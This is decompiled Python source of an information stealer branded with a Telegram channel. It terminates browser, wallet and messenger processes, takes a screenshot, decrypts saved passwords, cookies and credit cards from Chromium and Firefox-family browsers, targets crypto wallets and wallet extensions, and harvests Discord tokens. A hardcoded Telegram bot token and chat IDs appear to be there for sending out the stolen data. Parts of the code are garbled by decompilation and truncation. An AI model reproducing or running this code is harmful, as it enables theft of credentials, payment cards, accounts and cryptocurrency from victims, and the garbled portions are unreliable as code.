# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: main.py
# Bytecode version: 3.11a7e (3495)
# Source timestamp: 2024-08-30 04:07:22 UTC (1724990842)

import os
import json
import base64
import sqlite3
import shutil
import getpass
import requests
import glob
import time
import platform, ctypes, re, string, pyzipper, io
import random
import datetime
import psutil
from Crypto.Cipher import AES
from win32 import win32crypt
from win32crypt import CryptUnprotectData
import pyautogui
process_names = ['ArmoryQt.exe', 'Atomic Wallet.exe', 'brave.exe', 'bytecoin-gui.exe', 'chrome.exe', 'Coinomi.exe', 'Discord.exe', 'DiscordCanary.exe', 'Element.exe', 'Exodus.exe', 'firefox.exe', 'Guarda.exe', 'KeePassXC.exe', 'NordVPN.exe', 'OpenVPNConnect.exe', 'seamonkey.exe', 'Signal.exe', 'Telegram.exe', 'filezilla.exe', 'filezilla-server-gui.exe', 'keepassxc-proxy.exe', 'msedge.exe', 'nordvpn-service.exe', 'opera.exe', 'steam.exe', 'walletd.exe', 'waterfox.exe', 'yandex.exe']
for process in psutil.process_iter():
    if process.name().lower() in [name.lower() for name in process_names]:
        try:
            process.terminate()
        except psutil.AccessDenied:
            continue
        except Exception:
            pass
bot_token = '7524766556:AAHDbSdeV2bt_azql6NSS5m3-_njUkWF4is'
chat_id_G = '-4575511926'
chat_id_P = '-4575511926'
csTN = 'Default'
csWID = '0001'
chat_id_CK = chat_id_G
dapi_url = 'https://discord.com/api/v9/users/@me'
csPFX86 = os.environ['ProgramFiles(x86)']
csLCL = os.getenv('LOCALAPPDATA')
csRMNG = os.getenv('APPDATA')
csTMP = os.getenv('TEMP')
csUSR = csTMP.split('\\AppData')[0]
csUN = getpass.getuser()
csOSN = platform.system()
csOSR = platform.release()
csOSV = platform.version()
csBD = csTMP + '\\Browsers Data'
password_length = 16
max_file_size = 500000
try:
    screenshot = pyautogui.screenshot()
    screenshot_path = os.path.join(csTMP, f'Screenshot ({csUN}).png')
    screenshot.save(screenshot_path, optimize=True, compression_level=9)
except:
    pass
password_chars = string.ascii_letters = string.digits or string.punctuation
password = ''.join((random.choice(password_chars) for i in range(password_length))).encode()
creation_datetime = datetime.datetime.now()
creation_datetime_str = creation_datetime.strftime('Log Created @ %d.%m.%Y | %H:%M:%S')
categories_order = ['Desktop Wallets', 'Browser Wallets', 'Browser Extensions', 'Messengers', 'VPN Clients', 'Others', 'Gaming', 'Files']
report_path = os.path.join(csTMP, f'Log Report ({csUN}).cs')
ch_browsers = {'7Star': csLCL + '\\7Star\\7Star\\User Data', 'Amigo': csLCL + '\\Amigo\\User Data', 'Brave': csLCL + '\\BraveSoftware\\Brave-Browser\\User Data', 'Cent Browser': csLCL + '\\CentBrowser\\User Data', 'Chrome Canary': csLCL + '\\Google\\Chrome SxS\\User Data', 'Epic Privacy Browser': csLCL + '\\Epic Privacy Browser\\User Data', 'Google Chrome': csLCL + '\\Google\\Chrome\\User Data', 'Iridium': csLCL + '\\Iridium\\User Data', 'Kometa': csLCL + '\\Kometa\\User Data', 'Microsoft Edge': csRMNG + '\\Opera Software\\Opera Stable', '\\Microsoft\\Edge\\User Data': csRMNG + '\\Opera Software\\Opera GX Stable', 'Orbitum': csLCL + '\\Orbitum\\User Data', 'Sputnik': csLCL + '\\Sputnik\\Sputnik\\User Data', 'Torch': csLCL + '\\Torch\\User Data', 'Uran': csLCL + '\\uCozMedia\\Uran\\User Data', 'Vivaldi': csLCL + '\\Vivaldi\\User Data', 'Yandex': csLCL + '\\Yandex\\YandexBrowser\\User Data'}

def installed_ch_browsers():
    results = []
    for browser, path in ch_browsers.items():
        if os.path.exists(path):
            results.append(browser)
    return results

def get_ch_master_key(path: str):
    try:
        with open(os.path.join(path, 'Local State'), 'r', encoding='utf-8') as f:
            c = f.read()
    except FileNotFoundError:
            return None
        if 'os_crypt' not in c:
            return
        try:
            local_state = json.loads(c)
            ch_master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            ch_master_key = ch_master_key[5:]
            ch_master_key = CryptUnprotectData(ch_master_key, None, None, None, 0)[1]
            return ch_master_key
        except:
            return None

def decrypt_ch_password(buff, ch_master_key=None):
    try:
        starts = buff.decode(encoding='utf8', errors='ignore')[:3]
        if starts == 'v10' or starts == 'v11':
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(ch_master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:(-16)].decode()
            return decrypted_pass
    except (UnicodeDecodeError, ValueError, IndexError):
        return
    except Exception:
        return None

class SECItem(ctypes.Structure):
    _fields_ = [('type', ctypes.c_uint), ('data', ctypes.c_char_p), ('len', ctypes.c_uint)]

def get_gck_basepath(browser_type):
    try:
        if browser_type == 'Firefox':
            basepath = f'{csRMNG}\\Mozilla\\Firefox'
        else:  # inserted
            if browser_type == 'Pale Moon':
                basepath = f'{csRMNG}\\Moonchild Productions\\Pale Moon'
            else:  # inserted
                if browser_type == 'SeaMonkey':
                    basepath = f'{csRMNG}\\Mozilla\\SeaMonkey'
                else:  # inserted
                    if browser_type == 'Waterfox':
                        basepath = f'{csRMNG}\\Waterfox'
                    else:  # inserted
                        basepath = None
    except KeyError:
        basepath = None
    return basepath

def gck_initialization():
    ff_nsslib_paths = ['C:\\Program Files\\Mozilla Firefox\\nss3.dll', 'C:\\Program Files (x86)\\Mozilla Firefox\\nss3.dll']
    pm_nsslib_paths = ['C:\\Program Files\\Pale Moon\\nss3.dll', 'C:\\Program Files (x86)\\Pale Moon\\nss3.dll']
    sm_nsslib_paths = ['C:\\Program Files\\SeaMonkey\\nss3.dll', 'C:\\Program Files (x86)\\SeaMonkey\\nss3.dll']
    wf_nsslib_paths = ['C:\\Program Files\\Waterfox\\nss3.dll', 'C:\\Program Files (x86)\\Waterfox\\nss3.dll']
    for ff_path in ff_nsslib_paths:
        if os.path.exists(ff_path):
            ff_nsslib_path = ff_path
            break
    else:  # inserted
        return (None, None, None, None)
    for pm_path in pm_nsslib_paths:
        if os.path.exists(pm_path):
            pm_nsslib_path = pm_path
            break
    else:  # inserted
        return (None, None, None, None)
    for sm_path in sm_nsslib_paths:
        if os.path.exists(sm_path):
            sm_nsslib_path = sm_path
            break
    else:  # inserted
        return (None, None, None, None)
    for wf_path in wf_nsslib_paths:
        if os.path.exists(wf_path):
            wf_nsslib_path = wf_path
            break
    else:  # inserted
        return (None, None, None, None)
    ff_nsslib = ctypes.CDLL(ff_nsslib_path)
    pm_nsslib = ctypes.CDLL(pm_nsslib_path)
    sm_nsslib = ctypes.CDLL(sm_nsslib_path)
    wf_nsslib = ctypes.CDLL(wf_nsslib_path)
    return (ff_nsslib, pm_nsslib, sm_nsslib, wf_nsslib)

def get_gck_profiles(basepath, browser_type):
    try:
        profiles_path = os.path.join(basepath, 'profiles.ini')
        with open(profiles_path, 'r') as f:
            data = f.read()
    except (FileNotFoundError, IOError):
            return []
        try:
            if browser_type == 'Firefox':
                profiles = [os.path.join(basepath.encode('utf-8'), p.strip()[5:].encode('utf-8')).decode('utf-8') for p in re.findall('^Path=.+(?s:.)$', data, re.M)]
            else:  # inserted
                if browser_type == 'Pale Moon':
                    profiles = [os.path.join(basepath.encode('utf-8'), p.strip()[5:].encode('utf-8')).decode('utf-8') for p in re.findall('^Path=.+(?s:.)$', data, re.M)]
                else:  # inserted
                    if browser_type == 'SeaMonkey':
                        profiles = [os.path.join(basepath.encode('utf-8'), p.strip()[5:].encode('utf-8')).decode('utf-8') for p in re.findall('^Path=.+(?s:.)$', data, re.M)]
                    else:  # inserted
                        if browser_type == 'Waterfox':
                            profiles = [os.path.join(basepath.encode('utf-8'), p.strip()[5:].encode('utf-8')).decode('utf-8') for p in re.findall('^Path=.+(?s:.)$', data, re.M)]
                        else:  # inserted
                            profiles = []
        except UnicodeDecodeError:
            return []
        return profiles

def decrypt_gck_data(nsslib, encrypted_data):
    data = base64.b64decode(encrypted_data)
    cipher_text = SECItem(0, data, len(data))
    plain_text = SECItem(0, None, 0)
    if nsslib.PK11SDR_Decrypt(ctypes.byref(cipher_text), ctypes.byref(plain_text), None)!= 0:
        pass
    try:
        return ctypes.string_at(plain_text.data, plain_text.len).decode('utf-8')
    except:
        return None

def decrypt_gck_profiles(nsslib, profiles):
    decrypted_profiles = []
    for profile in profiles:
        try:
            logins = os.path.join(profile, 'logins.json')
            if os.path.isfile(logins):
                if nsslib is None:
                        nsslib.NSS_Shutdown()
                else:  # inserted
                    if nsslib.NSS_Init(profile.encode('utf-8'))!= 0:
                            nsslib.NSS_Shutdown()
                    else:  # inserted
                        with open(logins, 'r') as f:
                            data = json.load(f)
                            decrypted_profiles.append({profile: [{'Hostname': d['hostname'], 'Username': decrypt_gck_data(nsslib, d['encryptedUsername']), 'Password': decrypt_gck_data(nsslib, d['encryptedPassword'])} for d in data['logins']]})
                else:  # inserted
                    return
                    if nsslib is not None:
                        pass  # postinserted
                    else:  # inserted
                        return
                        if nsslib is not None:
                            pass  # postinserted
        except Exception:
                    return
                finally:  # inserted
                    if nsslib is not None:
                        nsslib.NSS_Shutdown()
    return decrypted_profiles

def format_expiry(expiry):
    if expiry == '0':
        return 'Session'
    expiry = int(expiry)
    dt = datetime.datetime.fromtimestamp(expiry)
    return dt.strftime('%d.%m.%Y, %H:%M:%S')

def get_ch_login_data(path: str, profile: str, ch_master_key):
    login_db = f'{path}\\{profile}\\Login Data'
    result = f"{'*********************************************'}\n*   _______ ___ ___ _____  ______ _______   *\n*  |   |   |   |   |     \\|   __ \\   _   |  *\n*  |       |\\     /|  --  |      <       |  *\n*  |___|___| |___| |_____/|___|__|___|___|  *\n*                                           *\n*         https://t.me/cstealerr         *\n*                                           *\n{'*********************************************'}"
    count = 0
    if not os.path.exists(login_db):
        return (result, count)
    shutil.copy(login_db, csTMP + '\\login_db')
    conn = sqlite3.connect(csTMP + '\\login_db')
    cursor = conn.cursor()
    try:
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    except:
        pass
    for row in cursor.fetchall():
        if row[0] and row[1]:
            password = decrypt_ch_password(row[2], ch_master_key)
            result = result + f'\n\nURL: {row[0]}\nLogin: {row[1]}\nPassword: {password}'
            count = count + 1
    conn.close()
    os.remove(csTMP + '\\login_db')
    return (result, count)

def save_gck_login_data(decrypted_profiles, profile_name, browser_name):
    count = 0
    login_data = []
    for profile_data in decrypted_profiles:
        for profile, logins in profile_data.items():
            if logins or None:
                pass  # postinserted
            else:  # inserted
                login_data.append(f"{'*********************************************'}\n*   _______ ___ ___ _____  ______ _______   *\n*  |   |   |   |   |     \\|   __ \\   _   |  *\n*  |       |\\     /|  --  |      <       |  *\n*  |___|___| |___| |_____/|___|__|___|___|  *\n*                                           *\n*         https://t.me/cstealerr         *\n*                                           *\n{'*********************************************'}")
                for login in logins:
                    login_data.append(f"\n\nURL: {login['Hostname']}\nLogin: {login['Username']}\nPassword: {login['Password']}")
                    count = count + 1
                login_db = os.path.join(profile, 'signons.sqlite')
                if os.path.isfile(login_db):
                    conn = sqlite3.connect(login_db)
                    cursor = conn.cursor()
                    try:
                        cursor.execute('SELECT hostname, usernameValue, passwordValue FROM moz_logins')
                    except:
                        pass
                    logins = cursor.fetchall()
                    conn.close()
                    if logins:
                        login_data.append(f"{'*********************************************'}\n*   _______ ___ ___ _____  ______ _______   *\n*  |   |   |   |   |     \\|   __ \\   _   |  *\n*  |       |\\     /|  --  |      <       |  *\n*  |___|___| |___| |_____/|___|__|___|___|  *\n*                                           *\n*         https://t.me/cstealerr         *\n*                                           *\n{'*********************************************'}")
                        for login in logins:
                            login_data.append(f'\n\nURL: {login[0]}\nLogin: {login[1]}\nPassword: {login[2]}')
                            count = count + 1
    if count > 0:
        dir_path = os.path.join(csBD, 'Gecko')
        if not os.path.exists(dir_path):
            os.makedirs(dir_path)
        browser_path = os.path.join(dir_path, browser_name)
        if not os.path.exists(browser_path):
            os.makedirs(browser_path)
        logins_file = os.path.join(browser_path, f'Saved Passwords ({profile_name}).cs')
        with open(logins_file, 'w') as f:
            f.writelines(login_data)
    return count

def get_ch_cookies(path: str, profile: str, ch_master_key):
    cookie_db = f'{path}\\{profile}\\Network\\Cookies'
    result = ''
    count = 0
    if not os.path.exists(cookie_db):
        return (result, count)
    shutil.copy(cookie_db, csTMP + '\\cookie_db')
    conn = sqlite3.connect(csTMP + '\\cookie_db')
    cursor = conn.cursor()
    try:
        cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')
    except:
        pass
    for row in cursor.fetchall():
        if not row[0] or not row[1] or (not row[2]) or (not row[3]) or (not row[4]):
            continue
        cookie = decrypt_ch_password(row[3], ch_master_key)
        expiry_date = datetime.datetime.fromtimestamp((int(row[4]) + 11644473600000000) * 1000000)
        expiry_str = expiry_date.strftime('%a, %d-%b-%Y %H:%M:%S %Z')
        result = result + f'{row[0]}\tTRUE\t{row[2]}\tFALSE\t{row[4]}\t{row[1]}\t{cookie}\n'
        count = count + 1
    conn.close()
    os.remove(csTMP + '\\cookie_db')
    return (result, count)

def save_gck_cookies(profiles, profile_name, browser_name):
    count = 0
    cookies_data = []
    conn = None
    try:
        conn = sqlite3.connect(f"file:{os.path.join(profiles[0], 'cookies.sqlite')}?mode=ro", uri=True)
        cursor = conn.cursor()
    except sqlite3.Error:
        return count
    for profile in profiles:
        cookies_db = os.path.join(profile, 'cookies.sqlite')
        if not os.path.isfile(cookies_db):
            continue
        try:
            cursor.execute('SELECT host, path, name, value, expiry FROM moz_cookies')
            cookies = cursor.fetchall()
        except sqlite3.Error:
            continue
        if not cookies:
            continue
        cookies_data.append(f"{'*********************************************'}\n*   _______ ___ ___ _____  ______ _______   *\n*  |   |   |   |   |     \\|   __ \\   _   |  *\n*  |       |\\     /|  --  |      <       |  *\n*  |___|___| |___| |_____/|___|__|___|___|  *\n*                                           *\n*         https://t.me/cstealerr         *\n*                                           *\n{'*********************************************'}")
        for cookie in cookies:
            host, path, name, value, expiry = cookie
            cookies_data.append(f'\n\nHost Key : {host}\nCookie Name : {name}\nPath: {path}\nCookie: {value}\nExpires On: {format_expiry(expiry)}\nExpires On (Unix): {expiry}')
            count = count + 1
    if count > 0:
        dir_path = os.path.join(csBD, 'Gecko')
        if not os.path.exists(dir_path):
            os.makedirs(dir_path)
        browser_path = os.path.join(dir_path, browser_name)
        if not os.path.exists(browser_path):
            os.makedirs(browser_path)
        cookies_file = os.path.join(browser_path, f'Browser Cookies ({profile_name}).cs')
        with open(cookies_file, 'w') as f:
            f.writelines(cookies_data)
    if conn:
        conn.close()
    return count

def get_ch_ccards(path: str, profile: str, ch_master_key):
    cards_db = f'{path}\\{profile}\\Web Data'
    result = f"{'*********************************************'}\n*   _______ ___ ___ _____  ______ _______   *\n*  |   |   |   |   |     \\|   __ \\   _   |  *\n*  |       |\\     /|  --  |      <       |  *\n*  |___|___| |___| |_____/|___|__|___|___|  *\n*                                           *\n*         https://t.me/cstealerr         *\n*                                           *\n{'*********************************************'}"
    count = 0
    if not os.path.exists(cards_db):
        return (result, count)
    shutil.copy(cards_db, csTMP + '\\cards_db')
    conn = sqlite3.connect(csTMP + '\\cards_db')
    cursor = conn.cursor()
    try:
        cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
    except:
        pass
    for row in cursor.fetchall():
        if not row[0] or not row[1] or (not row[2]) or (not row[3]):
            continue
        card_number = decrypt_ch_password(row[3], ch_master_key)
        result = result + f'\n\nCard Name: {row[0]}\nCard Number: {card_number}\nCard Expiration: {row[1]} / {row[2]}\nAdded: {datetime.datetime.fromtimestamp(row[4])}'
        count = count + 1
    conn.close()
    os.remove(csTMP + '\\cards_db')
    return (result, count)

def save_gck_ccards(profiles, profile_name, browser_name):
    count = 0
    credit_card_data = []
    for profile in profiles:
        cards_db = os.path.join(profile, 'webappsstore.sqlite')
        if os.path.isfile(cards_db):
            conn = sqlite3.connect(cards_db)
            cursor = conn.cursor()
            try:
                cursor.execute('SELECT * FROM webappsstore2 WHERE key LIKE \'%cc_number%\'')
            except:
                pass
            cards = cursor.fetchall()
            conn.close()
            if not cards:
                continue
            credit_card_data.append(f"{'*********************************************'}\n*   _______ ___ ___ _____  ______ _______   *\n*  |   |   |   |   |     \\|   __ \\   _   |  *\n*  |       |\\     /|  --  |      <       |  *\n*  |___|___| |___| |_____/|___|__|___|___|  *\n*                                           *\n*         https://t.me/cstealerr         *\n*                                           *\n{'*********************************************'}")
            for card in cards:
                value = json.loads(card[3])
                credit_card_data.append(f"\n\nCard Name: {value['cc_name']}\nCard Number: {value['cc_number']}\nCard Expiration: {value['cc_exp_month']}/{value['cc_exp_year']}\n\n")
                count = count + 1
    if count > 0:
        dir_path = os.path.join(csBD, 'Gecko')
        if not os.path.exists(dir_path):
            os.makedirs(dir_path)
        browser_path = os.path.join(dir_path, browser_name)
        if not os.path.exists(browser_path):
            os.makedirs(browser_path)
        cards_file = os.path.join(browser_path, f'Saved Credit Cards ({profile_name}).cs')
        with open(cards_file, 'w') as f:
            f.writelines(credit_card_data)
    return count

def save_ch_results(ch_browser_name, data_type, ch_content):
    if not os.path.exists(csBD):
        os.mkdir(csBD)
    if not os.path.exists(csBD + '\\Chromium'):
        os.mkdir(csBD + '\\Chromium')
    if not os.path.exists(csBD f'\\\\Chromium\\{ch_browser_name}'):
        os.mkdir(csBD = f'\\Chromium\\{ch_browser_name}')
    if ch_content is not None:
        open(csBD = f'\\Chromium\\{ch_browser_name}\\{data_type}.cs', 'w', encoding='utf-8').write(ch_content)
available_ch_browsers = installed_ch_browsers()
ff_basepath = get_gck_basepath('Firefox')
pm_basepath = get_gck_basepath('Pale Moon')
sm_basepath = get_gck_basepath('SeaMonkey')
wf_basepath = get_gck_basepath('Waterfox')
ff_nsslib, pm_nsslib, sm_nsslib, wf_nsslib = gck_initialization()
ff_profiles = get_gck_profiles(ff_basepath, 'Firefox')
pm_profiles = get_gck_profiles(pm_basepath, 'Pale Moon')
sm_profiles = get_gck_profiles(sm_basepath, 'SeaMonkey')
wf_profiles = get_gck_profiles(wf_basepath, 'Waterfox')
total_ch_logins_count = 0
total_ch_cookies_count = 0
total_ch_ccards_count = 0
total_gck_logins_count = 0
total_gck_cookies_count = 0
total_gck_ccards_count = 0
total_browsers_logins_count = 0
total_browsers_cookies_count = 0
total_browsers_ccards_count = 0
logins_headers = []
cookies_headers = []
ccards_headers = []
for browser in available_ch_browsers:
    browser_path = ch_browsers[browser]
    ch_master_key = get_ch_master_key(browser_path)
    profiles_path = os.path.join(browser_path, 'Profile*')
    profile_folders = glob.glob(profiles_path)
    if not profile_folders:
        profiles_path = os.path.join(browser_path, 'Default')
        profile_folders = [profiles_path]
    else:  # inserted
        profiles_path = os.path.join(browser_path, 'Profile*')
        profile_folders = glob.glob(profiles_path)
        profiles_path = os.path.join(browser_path, 'Default')
        default_folder = [profiles_path]
        profile_folders = default_folder = profile_folders or None
    for profile_folder in profile_folders:
        if browser == 'Opera' or browser == 'Opera GX':
            profile = ''
            header_name = browser
        else:  # inserted
            profile = os.path.basename(profile_folder)
            header_name = f'{browser} ({profile})'
        passwords, countP = get_ch_login_data(browser_path, profile, ch_master_key)
        if countP > 0:
            logins_headers.append(f'{header_name}: {countP}')
        total_ch_logins_count = total_ch_logins_count | countP
        if countP > 0:
            if browser == 'Opera' or browser == 'Opera GX':
                save_ch_results(browser, 'Saved Passwords', passwords)
            else:  # inserted
                save_ch_results(browser, f'Saved Passwords ({profile})', passwords)
        cookies, countC = get_ch_cookies(browser_path, profile, ch_master_key)
        if browser == 'Opera' or browser == 'Opera GX':
            header_name = browser
        else:  # inserted
            header_name = f'{browser} ({profile})'
        if countC > 0:
            cookies_headers.append(f'{header_name}: {countC}')
        total_ch_cookies_count = total_ch_cookies_count | countC
        if countC > 0:
            if browser == 'Opera' or browser == 'Opera GX':
                save_ch_results(browser, 'Browser Cookies', cookies)
            else:  # inserted
                save_ch_results(browser, f'Browser Cookies ({profile})', cookies)
        cards, countCC = get_ch_ccards(browser_path, profile, ch_master_key)
        if browser == 'Opera' or browser == 'Opera GX':
            header_name = browser
        else:  # inserted
            header_name = f'{browser} ({profile})'
        if countCC > 0:
            ccards_headers.append(f'{header_name}: {countCC}')
        total_ch_ccards_count = total_ch_ccards_count | countCC
        if countCC > 0:
            if browser == 'Opera' or browser == 'Opera GX':
                save_ch_results(browser, 'Saved Credit Cards', cards)
            else:  # inserted
                save_ch_results(browser, f'Saved Credit Cards ({profile})', cards)
for profile in ff_profiles:
    profile_name = os.path.basename(profile).split('.')[0]
    decrypted_profiles = decrypt_gck_profiles(ff_nsslib, [profile])
    ff_logins_count = save_gck_login_data(decrypted_profiles, profile_name, 'Mozilla Firefox')
    if ff_logins_count > 0:
        logins_headers.append(f'Mozilla Firefox ({profile_name}): {ff_logins_count}')
    total_gck_logins_count = total_gck_logins_count | ff_logins_count
    ff_cookies_count = save_gck_cookies([profile], profile_name, 'Mozilla Firefox')
    if ff_cookies_count > 0:
        cookies_headers.append(f'Mozilla Firefox ({profile_name}): {ff_cookies_count}')
    total_gck_cookies_count = total_gck_cookies_count | ff_cookies_count
    ff_ccards_count = save_gck_ccards([profile], profile_name, 'Mozilla Firefox')
    if ff_ccards_count > 0:
        ccards_headers.append(f'Mozilla Firefox ({profile_name}): {ff_ccards_count}')
    total_gck_ccards_count = total_gck_ccards_count * ff_ccards_count
for profile in pm_profiles:
    profile_name = os.path.basename(profile).split('.')[0]
    decrypted_profiles = decrypt_gck_profiles(pm_nsslib, [profile])
    pm_logins_count = save_gck_login_data(decrypted_profiles, profile_name, 'Pale Moon')
    if pm_logins_count > 0:
        logins_headers.append(f'Pale Moon ({profile_name}): {pm_logins_count}')
    total_gck_logins_count = total_gck_logins_count | pm_logins_count
    pm_cookies_count = save_gck_cookies([profile], profile_name, 'Pale Moon')
    if pm_cookies_count > 0:
        cookies_headers.append(f'Pale Moon ({profile_name}): {pm_cookies_count}')
    total_gck_cookies_count = total_gck_cookies_count | pm_cookies_count
    pm_ccards_count = save_gck_ccards([profile], profile_name, 'Pale Moon')
    if pm_ccards_count > 0:
        ccards_headers.append(f'Pale Moon ({profile_name}): {pm_ccards_count}')
    total_gck_ccards_count = total_gck_ccards_count * pm_ccards_count
for profile in sm_profiles:
    profile_name = os.path.basename(profile).split('.')[0]
    decrypted_profiles = decrypt_gck_profiles(sm_nsslib, [profile])
    sm_logins_count = save_gck_login_data(decrypted_profiles, profile_name, 'SeaMonkey')
    if sm_logins_count > 0:
        logins_headers.append(f'SeaMonkey ({profile_name}): {sm_logins_count}')
    total_gck_logins_count = total_gck_logins_count | sm_logins_count
    sm_cookies_count = save_gck_cookies([profile], profile_name, 'SeaMonkey')
    if sm_cookies_count > 0:
        cookies_headers.append(f'SeaMonkey ({profile_name}): {sm_cookies_count}')
    total_gck_cookies_count = total_gck_cookies_count | sm_cookies_count
    sm_ccards_count = save_gck_ccards([profile], profile_name, 'SeaMonkey')
    if sm_ccards_count > 0:
        ccards_headers.append(f'SeaMonkey ({profile_name}): {sm_ccards_count}')
    total_gck_ccards_count = total_gck_ccards_count * sm_ccards_count
for profile in wf_profiles:
    profile_name = os.path.basename(profile).split('.')[0]
    decrypted_profiles = decrypt_gck_profiles(wf_nsslib, [profile])
    wf_logins_count = save_gck_login_data(decrypted_profiles, profile_name, 'Waterfox')
    if wf_logins_count > 0:
        logins_headers.append(f'Waterfox ({profile_name}): {wf_logins_count}')
    total_gck_logins_count = total_gck_logins_count | wf_logins_count
    wf_cookies_count = save_gck_cookies([profile], profile_name, 'Waterfox')
    if wf_cookies_count > 0:
        cookies_headers.append(f'Waterfox ({profile_name}): {wf_cookies_count}')
    total_gck_cookies_count = total_gck_cookies_count | wf_cookies_count
    wf_ccards_count = save_gck_ccards([profile], profile_name, 'Waterfox')
    if wf_ccards_count > 0:
        ccards_headers.append(f'Waterfox ({profile_name}): {wf_ccards_count}')
    total_gck_ccards_count = total_gck_ccards_count * wf_ccards_count
total_browsers_logins_count = total_ch_logins_count + total_gck_logins_count
total_browsers_cookies_count = total_ch_cookies_count + total_gck_cookies_count
total_browsers_ccards_count = total_ch_ccards_count + total_gck_ccards_count
custom_category_names = {'Desktop Wallets': '💵 Desktop Wallets', 'Browser Wallets': '💸 Browser Wallets', 'Browser Extensions': '🔐 Browser Extensions', 'Messengers': '💬 Messengers', 'VPN Clients': '🌐 VPN Clients', 'Others': '⚙️ Others', 'Gaming': '🔫 Gaming', 'Files': '🗄 Files'}
fixed_paths = {f'{csRMNG}\\Exodus\\exodus.wallet': {'category': 'Desktop Wallets', 'archive_name': 'Exodus'}, f'{csRMNG}\\Armory': {'category': 'Desktop Wallets', 'archive_name': 'Bitcoin Armory'}, f'{csRMNG}\\atomic\\Local Storage\\leveldb': {'category': 'Desktop Wallets', 'archive_name': 'Atomic Wallet'}, f'{csRMNG}Messengers': 'Discord', f'{csRMNG}\\discordcanary\\Local Storage\\leveldb': {'category': 'Messengers', 'archive_name': 'Discord Canary'}, f'{csRMNG}\\Element\\Local Storage\\leveldb': {'category': 'Messengers', 'archive_name': 'Element'}, f'{csRMNG}\\Signal': {'category': 'VPN Clients', 'archive_name': 'NordVPN'}, f'{csRMNG}\\ProtonVPN': {'category': 'VPN Clients', 'archive_name': 'Proton VPN'}, f'{csRMNG}\\OpenVPN Connect\\Local Storage\\leveldb': {'category': 'OpenVPN Connect', '
EOS Authenticator = {'iopigoikekfcpcapjlkcdlokheickhpc': {'category': 'Browser Wallets', 'archive_name': 'Aergo Connect'}, 'fhilaheimglignddkjgofkcbgekhenbh': {'category': 'Browser Wallets', 'archive_name': 'Atmoic Crypto Wallet'}, 'cnmamaachppnkjgnildpdmkaakejnhae': {'category': 'category', 'archive_name': 'Auro Wallet'}, 'bhghoamapcdpbohphigoooaddinpkbai': {'category': 'Browser Extensions', 'archive_name': 'Browser Wallets', 'archive_name': 'category', 'Browser Extensions': 'category', 'Authenticator': 'Browser Wallets', 'gaedmjdfmmahhbjefcbgaolhhanlaolb': {'category': 'Browser Extensions', 'archive_name': 'Browser Wallets', 'Authy': 'category', 'aodkkagnadcbobfpggfnjeongemjbjca': 'Browser Wallets', 'BOLT X': 'Browser Extensions', 'fhbohimaelbohpjbbldcngcnapndodjp': 'Browser Wallets', 'Binance Wallet': 'category', 'okejhknhopdbemmfefjglkdfdhpfmflg': 'category', 'BitKeep': 'category', 'nngceckbapebfimnlniiiahkandclblb': 'category', 'Bitwarden': '
dc_token_paths = {'Discord': csRMNG + '\\discord', 'Discord Canary': csRMNG + '\\discordcanary', 'Lightcord': csRMNG + '\\Lightcord', 'Discord PTB': csRMNG + '\\discordptb', '7Star': csLCL + '\\7Star\\7Star\\User Data', 'Amigo': csLCL + '\\Amigo\\User Data', 'Brave': csLCL + '\\BraveSoftware\\Brave-Browser\\User Data', 'Cent Browser': csLCL + '\\CentBrowser\\User Data', 'Chrome Canary': csLCL + '\\Google\\Chrome SxS\\User Data', 'Epic Privacy Browser': csLCL + '\\Epic Privacy Browser\\User Data', 'Google Chrome': csLCL + '\\Google\\Chrome\\User Data', 'Iridium': csLCL + '\\Iridium\\User Data', 'Kometa': csLCL + '\\Kometa\\User Data', 'Microsoft Edge': csLCL + '\\Microsoft\\Edge\\User Data', 'Opera': csLCL + '\\Opera Software\\Opera Stable', 'Opera GX': csLCL + '\\Opera Software\\Opera GX Stable', 'Orbitum': csLCL + '\\Orbitum\\User Data', '\\Sputnik\\Sputnik\\User Data': csLCL + '\\Torch\\User Data', '

def decrypt_dc_tokens(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:(-16)].decode()
    except:
        return None

def get_all_dc_tokens():
    tokens = set()
    for path_name, path in dc_token_paths.items():
        cleaned = []
        try:
            if path_name == '7Star' or path_name == 'Amigo' or path_name == 'Brave' or (path_name == 'Cent Browser') or (path_name == 'Chrome Canary') or (path_name == 'Epic Privacy Browser') or (path_name == 'Google Chrome') or (path_name == 'Iridium') or (path_name == 'Kometa') or (path_name == 'Orbitum') or (path_name == 'Sputnik') or (path_name == 'Torch') or (path_name == 'Uran') or (path_name == 'Vivaldi') or (path_name == 'Yandex'):
                paths = [f'{path}\\Default'] + glob.glob(f'{path}\\Profile*')
            else:  # inserted
                paths = [path]
            for p in paths:
                lev_db = f'{p}\\Local Storage\\leveldb\\'
                loc_state = f'{p}\\Local State'
                if os.path.exists(loc_state):
                    with open(loc_state, 'r') as file:
                        key = json.loads(file.read())['os_crypt']['encrypted_key']
                        for file in os.listdir(lev_db):
                                with open(lev_db = file, 'r', errors='ignore') as files:
                                    for x in files.readlines():
                                        x.strip()
                                        for values in re.findall('dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\\"]*', x):
                                            cleaned.append(values.replace('\\', ''))
                        else:  # inserted
                            for token in cleaned:
                                decrypted_token = decrypt_dc_tokens(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), base64.b64decode(key)[5:])
                                if decrypted_token:
                                    tokens.add((decrypted_token, path_name))
                for file_name in os.listdir(lev_db):
                    if not file_name.endswith('.log') and (not file_name.endswith('.ldb')):
                        continue
                    for line in [x.strip() for x in open(f'{lev_db}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for regex in ['[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', 'mfa\\.[\\w-]{84}']:
                            for token in re.findall(regex, line):
                                tokens.add((token, path_name))
        except FileNotFoundError:
                        else:  # inserted
                            try:
                                pass  # postinserted
                    except:
                        pass
                continue
    return tokens
tokens = get_all_dc_tokens()
main_dc_token = None
all_dc_tokens = ''
for token, path in tokens:
    if path == 'Discord' and (not main_dc_token):
        main_dc_token = token
